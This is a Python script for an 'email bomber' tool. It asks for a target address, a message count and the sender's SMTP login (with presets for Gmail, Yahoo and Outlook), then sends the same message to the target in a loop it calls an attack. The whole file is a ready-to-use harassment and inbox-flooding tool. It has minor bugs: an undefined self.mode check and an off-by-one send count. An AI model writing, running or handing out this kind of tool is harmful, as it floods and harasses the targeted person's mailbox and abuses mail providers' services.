import smtplib
import sys

class EmailBomber:
    count = 0

    def __init__(self):
        try:
            print("initializing program")
            self.target = str(input('Enter target email: '))
            self.amount = int(input('Enter number of emails: '))

            if self.mode < int(1):
                print("ERROR: invalid number")
                sys.exit(1)
        except Exception as e:
            print(f'Error: {e}')



    def email(self):
        try:
            print('\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input('Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input('Enter from address <: '))
            self.fromPwd = str(input('Enter from password <: '))
            self.subject = str(input('Enter subject <: '))
            self.message = str(input('Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')


    def attack(self):
        print('\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print('\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

if __name__=='__main__':
    bomb = EmailBomber()
    bomb.email()
    bomb.attack()